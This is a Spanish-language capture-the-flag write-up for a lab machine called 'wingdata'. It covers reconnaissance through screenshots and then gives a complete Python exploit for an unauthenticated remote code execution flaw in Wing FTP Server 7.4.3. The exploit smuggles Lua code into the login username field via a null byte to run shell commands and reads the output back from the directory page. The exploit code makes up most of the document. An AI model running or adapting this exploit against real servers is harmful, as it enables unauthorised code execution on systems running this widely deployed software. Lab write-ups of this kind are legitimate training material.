# WRITE-UP de la maquina "wingdata"

### Reconocimiento:

Escaneo con nmap hacia todos los puertos y sus respectivas versiones:

<img width="767" height="338" alt="image" src="https://github.com/user-attachments/assets/6473580e-622f-4e34-ac16-2f24d89a73b0" />

Accedemos a la pagina web:

<img width="911" height="611" alt="image" src="https://github.com/user-attachments/assets/40e6baee-868d-4068-b374-f80d1764aa21" />

En su codigo fuente HTML se encuentra un subdominio llamado ftp:

<img width="729" height="123" alt="image" src="https://github.com/user-attachments/assets/baed5d60-88b3-40fc-b400-a00d5169b8f3" />

Lo tenemos que añadir al archivo /etc/hosts de nuestra maquina para que resuelva.

Subdominio FTP:

<img width="909" height="593" alt="image" src="https://github.com/user-attachments/assets/c5c8e4a8-5607-4ecf-9c59-ffff2b02bd76" />

En el login, abajo a la derecha se puede ver el nombre y version de el servidor FTP que estan utilizando el cual es `Wing-ftp 7.4.3` el cual tiene una vulnerabilidad de Remote code execution sin autenticacion.

He creado un exploit el cual explota esta vulnerabilidad:

``` python


from requests import *
from urllib.parse import *
import re
def exploit():
    target = "http://ftp.wingdata.htb"

    target_login = f"{target}/loginok.html"
    
    encoded_username = quote("anonymous")

    login_headers = {
        "Host": "ftp.wingdata.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target,
        "Connection": "keep-alive",
        "Referer": f"{target}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }
    
    command = "whoami"
    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        "%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    login_response = post(target_login, headers=login_headers, data=payload)
    login_status = login_response.status_code
    print(f"Login status: {login_status}")
    uid = login_response.cookies.get("UID")
    print("Uid cookie got")

    dir_url = f"{target}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    dir_response = get(dir_url, headers=dir_headers)
    status_dir = dir_response.status_code
    print(f"Status for dir.html: {status_dir}")
    output = re.split(r'<', dir_response.text)[0].strip()
    print(f"\n[+] Output:\n{output}")



exploit()

``







